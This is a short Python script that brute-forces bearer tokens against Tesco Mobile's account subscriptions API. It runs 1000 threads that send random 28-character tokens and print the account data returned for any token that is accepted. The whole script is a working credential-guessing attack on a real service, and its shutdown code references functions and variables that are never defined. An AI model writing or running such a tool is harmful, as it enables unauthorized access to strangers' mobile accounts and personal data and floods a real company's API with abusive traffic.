import requests
import random
import string
from colorama import *; init()
from concurrent.futures import ThreadPoolExecutor

def lol(thread):

    letters = string.ascii_letters + string.digits

    while True:
        key = ''.join(random.choice(letters) for i in range(28)) # TESCO BEARER TOKENS ARE 28 LONG

        headers = {'Authorization': f'Bearer {key}'}

        r = requests.get('https://api.tescomobile.com/app/accounts/v2/subscriptions/', headers = headers)

        if 'Invalid Access Token' in r.text:
            print(f'[THREAD {thread}] {Fore.LIGHTRED_EX}-{Fore.RESET} resp {r.status_code} | {key} invalid  |  {r.json()}')
        else:
            print(f'[THREAD {thread}] {Fore.LIGHTGREEN_EX}+{Fore.RESET} resp {r.status_code} | {key} works!  |  {r.json()}')
            print(f'[THREAD {thread}] shutting down...')
            thread_executor.shutdown(wait=False)
            for t in thread_executor._threads:
                terminate_thread(t)

if __name__ == '__main__':
    with ThreadPoolExecutor(max_workers=1000) as ex:
        for x in range(1000):
            ex.submit(lol, x)
